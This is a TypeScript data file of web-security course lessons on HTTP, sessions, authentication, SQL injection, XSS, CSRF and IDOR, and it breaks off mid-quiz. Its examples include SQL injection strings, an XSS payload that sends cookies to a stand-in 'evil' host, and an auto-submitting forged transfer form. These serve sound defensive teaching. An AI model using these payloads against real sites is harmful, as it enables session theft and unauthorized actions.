import { paths } from "@/routes/paths";
import {
  createLesson,
  createPathAssessment,
  mcQuiz,
  tfQuiz,
} from "../lessonFactory";

const PATH = "web-security";
const lab = (id: string, label: string) =>
  ({ label, to: `${paths.vulnerableLab}/${id}`, type: "vulnerable-lab" as const });

export const webSecurityLessons = [
  createLesson({
    id: "web-security-how-websites-work",
    pathId: PATH,
    order: 1,
    title: "How Websites Work",
    summary:
      "From browser to server and back — the client-server model, DNS, TLS, and where security controls live in a modern web stack.",
    objectives: [
      "Describe the client-server model for web applications",
      "Explain how DNS and TLS fit into a page load",
      "Identify trust boundaries between browser, application server, and database",
    ],
    introduction:
      "Every website you visit is a conversation between your browser (the client) and one or more servers on the internet. Understanding that conversation — what travels over the wire, what stays on the server, and where each component trusts the next — is the foundation of web security. Attackers do not break 'the internet'; they abuse specific steps in this flow: misleading DNS, weak TLS, trusting client input, or exposing data that should never leave the server.",
    coreConcepts: [
      "Browsers request resources (HTML, CSS, JavaScript, images) from servers using HTTP or HTTPS.",
      "DNS translates human-readable hostnames into IP addresses before any connection begins.",
      "TLS encrypts traffic between client and server, protecting confidentiality and integrity in transit.",
      "Application servers execute business logic; databases store persistent data behind a separate trust boundary.",
      "Static assets and API responses may be served from CDNs, load balancers, or microservices — each is a potential attack surface.",
    ],
    explanation:
      "When you type a URL, the browser parses it into scheme (https), host (example.com), path (/dashboard), and optional query string (?id=42). DNS resolution returns an IP address. The browser opens a TCP connection, performs a TLS handshake if HTTPS is used, then sends an HTTP request. The web server (or reverse proxy) routes the request to application code — often a framework like Express, Django, or ASP.NET. That code may read cookies, validate a session, query a database, and render HTML or JSON. The response travels back through the same chain. Security failures happen when any layer assumes another layer already validated something: the firewall assumes the app is safe, the app assumes the database query is parameterized, the browser assumes reflected HTML is harmless.",
    realWorld:
      "Major breaches often chain multiple web-layer mistakes. An attacker might find an exposed admin panel (information disclosure), bypass login with SQL injection (broken authentication), then exfiltrate customer records (broken access control). Defenders map each component in the architecture diagram and ask: what can an unauthenticated user reach? What can a normal user escalate to? What leaves the network unencrypted?",
    scenario:
      "You are reviewing a small e-commerce site. The marketing pages are static files on a CDN, but checkout hits an API on api.store.example. Login sets a session cookie; order history is fetched from /api/orders/{id}. Your job is to mark trust boundaries: where does user input first enter server-side code, and where must authorization be enforced?",
    practical: [
      {
        kind: "http",
        title: "Typical page load",
        content:
          "GET /products HTTP/2\nHost: shop.example\nUser-Agent: Mozilla/5.0\nAccept: text/html\n\n→ 200 OK\nContent-Type: text/html\n<body>…</body>",
      },
    ],
    terms: [
      { term: "Client-server model", definition: "Architecture where clients request services and servers provide them; the web is predominantly this model." },
      { term: "Reverse proxy", definition: "Intermediary (e.g. nginx) that forwards requests to backend apps, often terminating TLS." },
      { term: "Same-origin policy", definition: "Browser restriction limiting how documents from one origin can interact with another." },
      { term: "Trust boundary", definition: "A line where data crosses from a less trusted to a more trusted zone and must be validated." },
    ],
    mistakes: [
      "Treating the CDN or WAF as a substitute for secure application code.",
      "Assuming HTTPS alone means the application is safe from injection or access-control bugs.",
      "Forgetting that APIs and admin panels are part of the same attack surface as public pages.",
    ],
    defensive: [
      "Document architecture with trust boundaries and data flows before threat modeling.",
      "Enforce TLS everywhere; use HSTS to prevent downgrade attacks.",
      "Separate public static content from dynamic APIs with distinct security policies.",
    ],
    quiz: [
      mcQuiz(
        "ws-hww-q1",
        "Which component first translates example.com into an IP address?",
        ["TLS", "DNS", "HTTP", "The database"],
        1,
        "DNS resolves hostnames to IP addresses before the browser connects.",
      ),
      tfQuiz(
        "ws-hww-q2",
        "In a typical web app, business logic and database queries usually run on the server, not in the user's browser.",
        true,
        "Sensitive logic and data access belong server-side; client code can be inspected and modified.",
      ),
      mcQuiz(
        "ws-hww-q3",
        "What is a trust boundary in web security?",
        ["A firewall brand", "Where data crosses zones and must be validated", "A type of cookie", "A CSS framework"],
        1,
        "Trust boundaries mark where untrusted input or actors meet protected resources.",
      ),
    ],
    practiceLink: lab("info-leak", "Information Leak Lab"),
  }),

  createLesson({
    id: "web-security-http",
    pathId: PATH,
    order: 2,
    title: "HTTP Requests and Responses",
    summary:
      "Methods, headers, status codes, and body formats — the vocabulary attackers and defenders use when analyzing web traffic.",
    objectives: [
      "Identify common HTTP methods and when each is appropriate",
      "Interpret request and response headers relevant to security",
      "Recognize how status codes reveal application behavior to attackers",
    ],
    introduction:
      "HTTP is the language browsers and servers speak. Every form submission, API call, and file download is an HTTP message. Security tools — proxies, WAFs, SIEM parsers — all reason about these messages. If you can read a request and response, you can spot missing security headers, sensitive data in URLs, verbose error pages, and authorization gaps.",
    coreConcepts: [
      "GET retrieves resources; POST/PUT/PATCH submit or update data; DELETE removes resources; OPTIONS probes capabilities.",
      "Request headers carry cookies, auth tokens, content types, and client hints; response headers carry caching, security policy, and cookies.",
      "Status codes: 2xx success, 3xx redirect, 4xx client error, 5xx server error — each can leak information if overly descriptive.",
      "Query strings appear in URLs and logs; request bodies carry form and JSON payloads.",
      "HTTP/2 and HTTP/3 multiplex requests but preserve the same semantic model.",
    ],
    explanation:
      "A request line contains method, path, and HTTP version: GET /api/user/5 HTTP/1.1. Headers are key-value pairs; the blank line separates headers from an optional body. Cookies ride in the Cookie header on requests and Set-Cookie on responses. Authorization headers may carry Bearer tokens. Responses mirror this structure with a status line like 403 Forbidden. Attackers replay, tamper with, or forge requests using tools like Burp Suite — changing methods from GET to POST, swapping IDs in paths, or adding headers the developer forgot to validate. Defenders log method, path, status, user agent, and authenticated identity while redacting secrets.",
    realWorld:
      "Credential stuffing tools send thousands of POST /login requests; rate limiting and MFA address this at the HTTP layer. A 200 OK on /admin/users when the session is unauthenticated reveals broken access control. Redirect responses (302) with open Location headers enable phishing and open redirects.",
    scenario:
      "During a review you capture: POST /transfer HTTP/1.1 with body amount=1000&to=attacker. The app returns 302 to /success without checking CSRF or re-auth. List which HTTP-layer controls are missing.",
    practical: [
      {
        kind: "http",
        title: "Authenticated API request",
        content:
          "GET /api/orders/1042 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbG…\nAccept: application/json",
      },
    ],
    terms: [
      { term: "Idempotent", definition: "A method safe to repeat without changing outcome beyond the first call; GET and PUT are idempotent, POST typically is not." },
      { term: "Set-Cookie", definition: "Response header that instructs the browser to store a cookie for subsequent requests." },
      { term: "Content-Type", definition: "Header declaring the format of the message body, e.g. application/json or application/x-www-form-urlencoded." },
    ],
    mistakes: [
      "Putting secrets or PII in query strings where they appear in logs and browser history.",
      "Returning stack traces with 500 responses in production.",
      "Allowing dangerous methods (PUT, DELETE) on endpoints meant for GET only.",
    ],
    defensive: [
      "Use appropriate methods; enforce method allowlists on sensitive routes.",
      "Return generic error messages externally; log details server-side only.",
      "Set security headers on every response, not only HTML pages.",
    ],
    quiz: [
      mcQuiz(
        "ws-http-q1",
        "Which HTTP method is most appropriate for submitting a login form?",
        ["GET", "POST", "HEAD", "TRACE"],
        1,
        "POST carries credentials in the body rather than the URL, avoiding log and history exposure.",
      ),
      mcQuiz(
        "ws-http-q2",
        "A 401 Unauthorized response typically means:",
        ["The server crashed", "Authentication is required or failed", "The resource was not found", "Redirect to HTTPS"],
        1,
        "401 indicates missing or invalid authentication credentials.",
      ),
      tfQuiz(
        "ws-http-q3",
        "Request and response headers can affect security policy (e.g. cookies, CSP, HSTS).",
        true,
        "Headers are a primary mechanism for session management and browser-level defenses.",
      ),
    ],
    practiceLink: lab("info-leak", "Information Leak Lab"),
  }),

  createLesson({
    id: "web-security-cookies-sessions",
    pathId: PATH,
    order: 3,
    title: "Cookies and Sessions",
    summary:
      "How servers remember logged-in users, cookie flags that matter, and why client-side session data is dangerous.",
    objectives: [
      "Explain how session identifiers link browsers to server-side state",
      "Configure HttpOnly, Secure, and SameSite cookie attributes",
      "Compare session cookies with token-based approaches",
    ],
    introduction:
      "HTTP is stateless — each request is independent. Sessions glue consecutive requests into a continuous login. Most sites issue a session ID stored in a cookie; the server maps that ID to user data in memory, Redis, or a database. If attackers steal or forge session identifiers, they become that user. If developers store roles in unsigned client cookies, privilege escalation is trivial.",
    coreConcepts: [
      "Session ID should be long, random, and meaningless — never embed user ID or role in plaintext client storage.",
      "HttpOnly prevents JavaScript from reading the cookie, reducing XSS impact.",
      "Secure sends the cookie only over HTTPS.",
      "SameSite limits cross-site cookie inclusion, mitigating some CSRF scenarios.",
      "Session fixation attacks force a victim to use an attacker-known session ID; regenerate ID on login.",
    ],
    explanation:
      "On successful login the server creates a session record and returns Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax. Subsequent requests include Cookie: sessionid=abc123. The server looks up abc123, loads the user, and applies authorization. Timeouts and idle limits reduce window for stolen sessions. Logout must invalidate server-side state, not only delete the client cookie. JWTs in localStorage trade server lookups for client-held tokens — but XSS can exfiltrate them, and revocation is harder without short lifetimes and refresh flows.",
    realWorld:
      "Session hijacking via XSS or network sniffing on HTTP sites still appears in incident reports. Apps that store isAdmin=true in a cookie without signing led to widespread privilege escalation in CTFs and real pentests alike.",
    scenario:
      "After login, you notice Set-Cookie: role=user without HttpOnly. JavaScript can read document.cookie and the value is sent on every request. Predict how an attacker escalates to admin.",
    terms: [
      { term: "Session fixation", definition: "Attacker sets victim's session ID before login so both share the same session after authentication." },
      { term: "Session timeout", definition: "Automatic invalidation after inactivity or absolute time limit." },
      { term: "Rotation", definition: "Issuing a new session ID after privilege change or periodically to limit reuse of stolen IDs." },
    ],
    mistakes: [
      "Storing session tokens in localStorage where any XSS script can read them.",
      "Omitting Secure on production cookies.",
      "Never invalidating sessions server-side on logout or password change.",
    ],
    defensive: [
      "Use server-side sessions or signed, short-lived tokens with refresh rotation.",
      "Set HttpOnly, Secure, SameSite on all session cookies.",
      "Regenerate session ID on login and privilege elevation.",
    ],
    quiz: [
      mcQuiz(
        "ws-cookie-q1",
        "Which flag prevents JavaScript from accessing a cookie?",
        ["Secure", "HttpOnly", "SameSite", "Path"],
        1,
        "HttpOnly blocks document.cookie access, reducing XSS token theft.",
      ),
      tfQuiz(
        "ws-cookie-q2",
        "Storing a user's role in an unsigned client-side cookie is safe if the admin panel URL is secret.",
        false,
        "Security through obscurity fails; attackers can modify cookies or call APIs directly.",
      ),
      mcQuiz(
        "ws-cookie-q3",
        "SameSite=Lax primarily helps mitigate:",
        ["SQL injection", "Some cross-site request scenarios", "Path traversal", "Disk full errors"],
        1,
        "SameSite reduces cross-site cookie inclusion on navigations and some requests.",
      ),
    ],
    practiceLink: lab("cookie-monster", "Cookie Monster Lab"),
  }),

  createLesson({
    id: "web-security-authentication",
    pathId: PATH,
    order: 4,
    title: "Authentication",
    summary:
      "Proving identity with passwords, MFA, and secure credential handling — and how authentication breaks in the wild.",
    objectives: [
      "Describe secure password storage with slow hashing",
      "Explain multi-factor authentication and when it is required",
      "Recognize authentication bypass via injection and logic flaws",
    ],
    introduction:
      "Authentication answers: who is this user? It is the gate before authorization. Weak password storage, missing MFA on sensitive accounts, and SQL injection in login forms are among the oldest and most damaging web flaws. Modern systems combine credential verification, rate limiting, device signals, and step-up authentication for high-risk actions.",
    coreConcepts: [
      "Passwords must be hashed with adaptive algorithms (bcrypt, Argon2, scrypt) — never MD5 or plaintext.",
      "MFA adds something you have or are, blocking credential-stuffing success.",
      "Account enumeration via different error messages aids attackers; use generic login failures.",
      "Authentication bypass occurs when input becomes part of a query or command without sanitization.",
      "OAuth and SSO delegate identity to identity providers; misconfiguration can still leak tokens.",
    ],
    explanation:
      "A login handler receives username and password, looks up the user record, and compares the password to a stored hash using a constant-time comparison. On success, issue a session. SQL injection in login might turn WHERE username='x' AND password='y' into a always-true condition. Logic flaws skip password checks entirely when a hidden parameter is set. Brute force and stuffing are volume attacks — mitigate with rate limits, CAPTCHA after failures, and breached-password lists. MFA should protect admin and financial operations at minimum.",
    realWorld:
      "Credential stuffing uses leaked password pairs from other breaches. Hashing limits offline cracking after DB theft but does not stop reuse of known passwords. MFA blocks most automated stuffing when passwords match.",
    scenario:
      "Login form shows 'Invalid password' for known users and 'User not found' otherwise. Explain how an attacker builds a valid username list before password attacks.",
    terms: [
      { term: "Credential stuffing", definition: "Automated login attempts using username/password pairs from prior breaches." },
      { term: "Salting", definition: "Unique random value per password combined before hashing to defeat rainbow tables." },
      { term: "Step-up authentication", definition: "Requiring stronger verification before sensitive actions like wire transfers." },
    ],
    mistakes: [
      "Building SQL queries by concatenating username and password fields.",
      "Emailing passwords in plaintext on 'forgot password' flows that reveal the old password.",
      "Skipping MFA for API keys and admin interfaces.",
    ],
    defensive: [
      "Use parameterized queries and framework auth libraries.",
      "Enforce MFA, rate limits, and account lockout policies proportionate to risk.",
      "Use generic error messages and monitor for authentication anomalies.",
    ],
    quiz: [
      mcQuiz(
        "ws-auth-q1",
        "Which storage approach is appropriate for passwords?",
        ["Plaintext in the database", "MD5 hash", "bcrypt or Argon2 with salt", "Base64 encoding"],
        2,
        "Adaptive salted hashes resist offline cracking if the database is stolen.",
      ),
      tfQuiz(
        "ws-auth-q2",
        "SQL injection in a login form can allow authentication bypass without knowing the correct password.",
        true,
        "Injection can alter the query logic to always return a valid user row.",
      ),
      mcQuiz(
        "ws-auth-q3",
        "MFA primarily mitigates:",
        ["XSS in comments", "Stolen or guessed passwords alone", "Missing CSP headers", "Slow DNS"],
        1,
        "A second factor blocks access even when the password is known.",
      ),
    ],
    practiceLink: lab("broken-login", "Broken Login Lab"),
  }),

  createLesson({
    id: "web-security-authorization",
    pathId: PATH,
    order: 5,
    title: "Authorization",
    summary:
      "After identity is proven, what may this user do? Server-side enforcement, roles, and object-level access control.",
    objectives: [
      "Distinguish authentication from authorization",
      "Implement object-level checks on every sensitive request",
      "Recognize horizontal and vertical privilege escalation",
    ],
    introduction:
      "Authorization decides permissions. Being logged in is not enough — a customer must not view another customer's orders, and a standard user must not access admin APIs. Hiding buttons in the UI is not authorization. Every API endpoint and server action must verify that the authenticated subject may perform the operation on the specific resource.",
    coreConcepts: [
      "Role-based access control (RBAC) maps roles to permissions; attribute-based (ABAC) uses finer-grained rules.",
      "Object-level authorization checks ownership: can user 5 read order 1042?",
      "Vertical escalation gains higher privileges (user → admin); horizontal accesses peers' data.",
      "IDOR is failed object-level authorization when IDs are predictable.",
      "Default deny: deny unless an explicit rule allows the action.",
    ],
    explanation:
      "After session validation, middleware may load roles. Handlers must still verify resource scope: GET /api/invoices/99 requires invoice 99 belongs to the session user. Admin routes need explicit role checks, not URL secrecy. GraphQL and REST batch endpoints multiply authorization surfaces. Service accounts and API keys need scoped permissions too. Audit logs for privilege changes help detect escalation.",
    realWorld:
      "BOLA/IDOR appears repeatedly in OWASP API Top 10. Mobile apps often call the same APIs as the web UI — if the server trusts only the client UI, mobile traffic exposes the gap immediately.",
    scenario:
      "An employee portal returns profile data for GET /user?id=12. Logged-in users see their own profile at id=12. What happens when id=13 is requested?",
    terms: [
      { term: "RBAC", definition: "Access control model assigning permissions to roles, users to roles." },
      { term: "BOLA", definition: "Broken Object Level Authorization — API term for accessing objects without permission." },
      { term: "Privilege escalation", definition: "Gaining access beyond intended permission level." },
    ],
    mistakes: [
      "Checking authorization only in frontend route guards.",
      "Assuming sequential IDs are secret.",
      "Granting admin role in JWT claims without server-side verification on each request.",
    ],
    defensive: [
      "Centralize authorization policy; test every endpoint with multiple user contexts.",
      "Use unpredictable IDs or always resolve resources through the authenticated user's scope.",
      "Log and alert on repeated 403s and admin actions.",
    ],
    quiz: [
      mcQuiz(
        "ws-authz-q1",
        "Authorization answers which question?",
        ["Who is the user?", "What may this user do?", "How fast is the server?", "Which DNS server to use?"],
        1,
        "Authorization governs permitted actions after identity is established.",
      ),
      tfQuiz(
        "ws-authz-q2",
        "Hiding an admin link in HTML is sufficient to protect the admin API.",
        false,
        "Attackers call APIs directly; server-side checks are mandatory.",
      ),
      mcQuiz(
        "ws-authz-q3",
        "Accessing another user's data at the same privilege level is called:",
        ["Vertical escalation", "Horizontal escalation", "DNS poisoning", "Session fixation"],
        1,
        "Horizontal escalation accesses peer resources; vertical gains higher roles.",
      ),
    ],
    practiceLink: lab("whos-that-user", "Who's That User? Lab"),
  }),

  createLesson({
    id: "web-security-input-validation",
    pathId: PATH,
    order: 6,
    title: "Input Validation",
    summary:
      "All user input is untrusted — validating, sanitizing, and encoding at the right layer stops most injection classes.",
    objectives: [
      "Apply allowlist validation for structure and type",
      "Separate validation from encoding for output context",
      "Identify server-side validation as mandatory regardless of client checks",
    ],
    introduction:
      "Browsers, mobile apps, and API clients all send input attackers control. Validation asks: is this data well-formed and within expected bounds? Sanitization removes or neutralizes dangerous content. Encoding ensures data displayed in HTML, SQL, or shell contexts cannot break out of its context. Client-side validation improves UX but never provides security.",
    coreConcepts: [
      "Validate type, length, range, format, and allowed character set on the server.",
      "Allowlists beat denylists — blocking <script> misses many XSS vectors.",
      "Canonicalize input before validation (Unicode normalization, path resolution).",
      "Use framework validators and schema libraries (JSON Schema, Zod, class-validator).",
      "Business rules (sufficient balance, valid coupon) are validation too.",
    ],
    explanation:
      "A registration email field should reject strings without @, exceed max length, and strip control characters. File uploads need content-type verification, size caps, and storage outside the web root. Search boxes must not pass raw input to SQL or shell. Validation errors should not echo raw input back into HTML without encoding — that creates reflected XSS. Defense in depth: validate early, parameterize queries, encode on output.",
    realWorld:
      "Unicode homoglyphs bypass naive filters. Double encoding bypasses WAFs. Path traversal uses ../ after validation if paths are not canonicalized. Each context — HTML attribute, JavaScript string, SQL — needs its own encoding rules.",
    scenario:
      "A zip code field accepts 10 characters. An attacker submits 5MB of data. Which validation dimensions failed?",
    terms: [
      { term: "Allowlist", definition: "Permit only known-good values or patterns; reject everything else." },
      { term: "Canonicalization", definition: "Converting input to a standard form before comparison or storage." },
      { term: "Output encoding", definition: "Transforming data so it is treated as text, not executable code, in a given context." },
    ],
    mistakes: [
      "Relying on JavaScript form validation only.",
      "Blacklisting bad words instead of defining acceptable input.",
      "Validating before decoding, letting encoded payloads slip through.",
    ],
    defensive: [
      "Define schemas per endpoint; reject unexpected fields.",
      "Use parameterized APIs for databases and templating engines with auto-escaping.",
      "Log validation failures to detect probing.",
    ],
    quiz: [
      mcQuiz(
        "ws-input-q1",
        "Why is client-side validation insufficient for security?",
        ["Browsers are too slow", "Attackers can send requests directly to the server", "HTML has no forms", "Cookies block validation"],
        1,
        "Bypassing the UI is trivial with proxies or custom HTTP clients.",
      ),
      tfQuiz(
        "ws-input-q2",
        "Allowlist validation is generally stronger than trying to block known bad patterns.",
        true,
        "Denylists cannot cover all attack variants; allowlists define explicit safe input.",
      ),
      mcQuiz(
        "ws-input-q3",
        "Output encoding is primarily about:",
        ["Making pages load faster", "Safe display in a specific context (HTML, JS, URL)", "Compressing images", "DNS caching"],
        1,
        "Encoding prevents interpreted characters from breaking out of their context.",
      ),
    ],
    practiceLink: lab("fake-database", "Fake Database Lab"),
  }),

  createLesson({
    id: "web-security-sql-injection",
    pathId: PATH,
    order: 7,
    title: "SQL Injection Concepts",
    summary:
      "When user input becomes part of a SQL query — how injection works, how to detect it, and how parameterized queries stop it.",
    objectives: [
      "Explain how string concatenation enables SQL injection",
      "Describe UNION, boolean, and error-based injection at a high level",
      "Apply parameterized queries as the primary defense",
    ],
    introduction:
      "SQL injection is among the most impactful web vulnerabilities. If application code builds queries by embedding user input in strings, attackers can change query logic — bypassing login, reading arbitrary rows, or modifying data. The fix is structural: never concatenate untrusted input into SQL; bind parameters instead.",
    coreConcepts: [
      "Injection occurs when input breaks out of its intended string or numeric context in SQL.",
      "Classic payloads use quotes, comments (--), and OR 1=1 to force true conditions.",
      "UNION attacks append SELECT results from other tables.",
      "Blind injection infers data from boolean or timing differences when errors are hidden.",
      "ORMs reduce risk but raw queries and stored procedures can still be vulnerable.",
    ],
    explanation:
      "Vulnerable: SELECT * FROM users WHERE name = 'userInput'. Input admin' OR '1'='1' -- yields a always-true WHERE clause. Parameterized: SELECT * FROM users WHERE name = ? with bound value treats input as data only. Least-privilege DB accounts limit damage — the web user should not DROP tables. WAFs and input filters are backup layers, not substitutes for parameterization.",
    realWorld:
      "SQL injection appears in OWASP Top 10 repeatedly. Automated scanners find basic cases; manual testers chain injection with file read (LOAD_FILE) or OS command execution on misconfigured databases.",
    scenario:
      "Search box query: SELECT name FROM products WHERE name LIKE '%userTerm%'. Show how injecting %' OR 1=1 -- returns all products.",
    practical: [
      {
        kind: "code",
        title: "Vulnerable vs safe",
        content:
          "// Vulnerable\nconst q = `SELECT * FROM users WHERE id = ${req.params.id}`;\n// Safe\nconst q = 'SELECT * FROM users WHERE id = ?';\ndb.query(q, [req.params.id]);",
      },
    ],
    terms: [
      { term: "Prepared statement", definition: "SQL sent to the database with placeholders; values bound separately." },
      { term: "UNION injection", definition: "Appending UNION SELECT to leak columns from other tables." },
      { term: "Second-order injection", definition: "Malicious input stored safely then executed unsafely when read later." },
    ],
    mistakes: [
      "Escaping quotes manually instead of using driver parameter binding.",
      "Assuming ORM usage guarantees safety on all code paths.",
      "Granting database users excessive privileges.",
    ],
    defensive: [
      "Parameterized queries everywhere; static analysis for string-built SQL.",
      "Least-privilege DB roles; separate read/write accounts where possible.",
      "Disable detailed SQL errors in production responses.",
    ],
    quiz: [
      mcQuiz(
        "ws-sqli-q1",
        "The primary defense against SQL injection is:",
        ["Longer passwords", "Parameterized queries", "Faster CPUs", "More cookies"],
        1,
        "Parameter binding separates code from data so input cannot alter query structure.",
      ),
      tfQuiz(
        "ws-sqli-q2",
        "Input admin' OR '1'='1' -- can bypass login when credentials are concatenated into SQL strings.",
        true,
        "The OR clause makes the WHERE condition always true, skipping password verification.",
      ),
      mcQuiz(
        "ws-sqli-q3",
        "A web app DB account should ideally:",
        ["Have dbo/admin rights", "Have only the minimum permissions needed", "Share one password for all apps", "Be embedded in JavaScript"],
        1,
        "Least privilege limits what injection can reach even if it occurs.",
      ),
    ],
    practiceLink: lab("fake-database", "Fake Database Lab"),
  }),

  createLesson({
    id: "web-security-xss",
    pathId: PATH,
    order: 8,
    title: "XSS Concepts",
    summary:
      "Cross-site scripting executes attacker JavaScript in victims' browsers — reflected, stored, and DOM-based variants.",
    objectives: [
      "Differentiate reflected, stored, and DOM-based XSS",
      "Explain impact: session theft, defacement, keylogging",
      "Apply contextual output encoding and Content-Security-Policy",
    ],
    introduction:
      "Cross-Site Scripting (XSS) turns a website into a delivery mechanism for malicious JavaScript. If user-supplied data is embedded in HTML without encoding, browsers execute attacker script in the victim's origin — accessing cookies (if not HttpOnly), performing actions as the user, or stealing tokens.",
    coreConcepts: [
      "Reflected XSS: payload in request immediately echoed in response (search errors, phishing links).",
      "Stored XSS: payload saved server-side and served to other users (comments, profiles).",
      "DOM XSS: client-side JavaScript writes untrusted data to the DOM unsafely.",
      "Context matters: HTML text, attribute, JavaScript string, and URL each need different encoding.",
      "Content-Security-Policy restricts script sources as defense in depth.",
    ],
    explanation:
      "Echoing <script>alert(1)</script> in a guestbook without encoding runs in visitors' browsers. Event handlers like <img src=x onerror=...> work when script tags are filtered. Stored XSS in an admin comment might compromise every viewer. DOM XSS in single-page apps happens when location.hash is written to innerHTML. Defenses: encode on output, sanitize rich HTML with vetted libraries, CSP with nonce or hash, HttpOnly cookies.",
    realWorld:
      "XSS chains with CSRF-like actions from the victim's browser. Bug bounty reports often combine stored XSS on a support portal with session riding to access internal tools.",
    scenario:
      "A guestbook reflects names in <div>{name}</div> without escaping. Attacker submits <img src=x onerror=fetch('https://evil/?c='+document.cookie)>. Describe the impact if cookies lack HttpOnly.",
    terms: [
      { term: "CSP", definition: "Content-Security-Policy header limiting which scripts and resources may load." },
      { term: "HTML encoding", definition: "Replacing <, >, &, quotes with entities so browsers render text literally." },
      { term: "Sanitization", definition: "Removing dangerous tags/attributes while allowing safe subset of HTML." },
    ],
    mistakes: [
      "Filtering only <script> while ignoring event handlers and javascript: URLs.",
      "Using innerHTML with API data in SPAs.",
      "Assuming JSON responses cannot affect HTML pages on the same origin.",
    ],
    defensive: [
      "Encode output per context; use framework auto-escaping defaults.",
      "Deploy strict CSP; avoid inline script where possible.",
      "Set HttpOnly on session cookies to limit XSS cookie theft.",
    ],
    quiz: [
      mcQuiz(
        "ws-xss-q1",
        "Stored XSS differs from reflected XSS because:",
        ["It only affects the attacker", "The payload persists and may affect other users", "It requires SQL", "It only works on HTTP"],
        1,
        "Stored payloads are saved and served to subsequent visitors.",
      ),
      mcQuiz(
        "ws-xss-q2",
        "Which header helps browsers block unauthorized script execution?",
        ["Content-Security-Policy", "Accept-Language", "ETag", "Server"],
        0,
        "CSP defines allowed script and resource sources.",
      ),
      tfQuiz(
        "ws-xss-q3",
        "HttpOnly cookies can still be read by JavaScript if XSS is present.",
        false,
        "HttpOnly prevents JavaScript access; XSS cannot exfiltrate those cookies via document.cookie.",
      ),
    ],
    practiceLink: lab("echo-chamber", "Echo Chamber Lab"),
  }),

  createLesson({
    id: "web-security-csrf",
    pathId: PATH,
    order: 9,
    title: "CSRF",
    summary:
      "Cross-site request forgery tricks a victim's browser into performing unwanted authenticated actions.",
    objectives: [
      "Explain how browsers automatically attach cookies to cross-site requests",
      "Implement CSRF tokens, SameSite cookies, and re-authentication for sensitive actions",
      "Distinguish CSRF from XSS",
    ],
    introduction:
      "If you are logged into your bank, your browser sends session cookies with requests to the bank's domain. A malicious site can trick your browser into submitting a form or image request to the bank while you are still logged in — transferring funds or changing email without your intent. CSRF abuses the browser's cookie behavior, not a bug in reading cookies via script.",
    coreConcepts: [
      "CSRF targets state-changing actions (POST, PUT, DELETE), not idempotent reads.",
      "SameSite cookies reduce cross-site submission of session cookies.",
      "Synchronizer tokens: server embeds unpredictable token in form; validates on POST.",
      "Double-submit cookie and custom headers (X-Requested-With, fetch metadata) add layers.",
      "Re-auth or MFA for high-impact operations limits CSRF damage.",
    ],
    explanation:
      "Attacker page: <form action='https://bank.com/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='1000'></form><script>document.forms[0].submit()</script>. Victim's session cookie goes with the request. Defenses: require CSRF token known only to legitimate pages, SameSite=Lax or Strict on session cookie, verify Origin/Referer headers. APIs using Authorization Bearer headers from JavaScript are less vulnerable to classic CSRF but need XSS protection instead.",
    realWorld:
      "CSRF protections are often missing on JSON APIs that also accept form-encoded bodies. Frameworks like Django and Rails include CSRF middleware — disabling it globally has caused incidents.",
    scenario:
      "Email change endpoint accepts POST with only session cookie auth. Attacker hosts a page auto-posting new email. Which controls stop this?",
    terms: [
      { term: "Synchronizer token", definition: "Secret value per session/form validated server-side on state-changing requests." },
      { term: "SameSite", definition: "Cookie attribute controlling cross-site inclusion on requests." },
      { term: "State-changing request", definition: "HTTP request that modifies data or performs an action, not merely reads." },
    ],
    mistakes: [
      "Protecting HTML forms but leaving JSON endpoints open to simple form POSTs.",
      "Using GET for actions that change state.",
      "Validating CSRF tokens only on some routes.",
    ],
    defensive: [
      "CSRF tokens on all state-changing endpoints; SameSite cookies.",
      "Require custom headers or Content-Type application/json for APIs.",
      "Confirm sensitive actions with password or MFA.",
    ],
    quiz: [
      mcQuiz(
        "ws-csrf-q1",
        "CSRF primarily exploits:",
        ["SQL in login forms", "Browser sending cookies on cross-site requests", "Weak TLS ciphers", "DNS cache poisoning"],
        1,
        "The browser attaches session cookies without the user's awareness on forged requests.",
      ),
      tfQuiz(
        "ws-csrf-q2",
        "GET requests that change account settings are dangerous from a CSRF perspective.",
        true,
        "GET should be safe and idempotent; state changes via GET are CSRF-vulnerable.",
      ),
      mcQuiz(
        "ws-csrf-q3",
        "Which mitigation is designed specifically for CSRF?",
        ["Parameterized SQL", "CSRF synchronizer token", "Disk encryption", "Port scanning"],
        1,
        "Tokens prove the request originated from the legitimate application UI.",
      ),
    ],
    practiceLink: lab("cookie-monster", "Cookie Monster Lab"),
  }),

  createLesson({
    id: "web-security-idor",
    pathId: PATH,
    order: 10,
    title: "IDOR",
    summary:
      "Insecure Direct Object Reference — accessing objects by changing IDs without proper authorization checks.",
    objectives: [
      "Define IDOR and relate it to broken object-level authorization",
      "Test horizontal access by swapping identifiers in URLs and APIs",
      "Apply server-side ownership checks and unpredictable IDs where appropriate",
    ],
    introduction:
      "IDOR occurs when applications expose internal object identifiers (user ID, invoice number, file name) and fail to verify the requester may access that object. Changing ?userId=5 to ?userId=6 must not work unless user 5 is allowed to see user 6's data. This flaw is simple to exploit and extremely common in REST APIs.",
    coreConcepts: [
      "Sequential integers in URLs are easy to enumerate.",
      "Authorization must use session identity + resource ID, not trust the ID alone.",
      "UUIDs obscure IDs but do not replace authorization checks.",
      "Mass assignment can create IDOR by letting users set foreign keys they should not control.",
      "API versioning and mobile clients increase IDOR exposure if parity testing is weak.",
    ],
    explanation:
      "GET /api/receipt/1001 returns JSON for the logged-in user when 1001 is theirs. If the server only checks authentication, not ownership, receipt 1002 leaks. Fix: SELECT * FROM receipts WHERE id = ? AND owner_id = session.user_id. For shared resources, check team membership or ACLs. Log access patterns — scanners increment IDs rapidly.",
    realWorld:
      "IDOR bugs have exposed tax records, medical images, and private messages in production apps. Bug bounty programs classify predictable ID access as high impact when PII is involved.",
    scenario:
      "Profile viewer at /user/104 shows public fields. Incrementing to /user/105 reveals private email. Identify the missing control.",
    terms: [
      { term: "IDOR", definition: "Insecure Direct Object Reference — unauthorized access via manipulated object identifiers." },
      { term: "Enumeration", definition: "Systematically trying IDs or values to discover valid objects." },
      { term: "Object-level authorization", definition: "Per-resource check that the subject may access that specific object." },
    ],
    mistakes: [
      "Assuming UUIDs mean attackers cannot find other objects.",
      "Checking role but not resource ownership.",
      "Exposing internal IDs in client-side JavaScript without server enforcement.",
    ],
    defensive: [
      "Authorize every read/write against the authenticated principal.",
      "Use indirect references mapping opaque tokens to internal IDs server-side.",
      "Automated tests with two user accounts swapping object IDs.",
    ],
    quiz: [
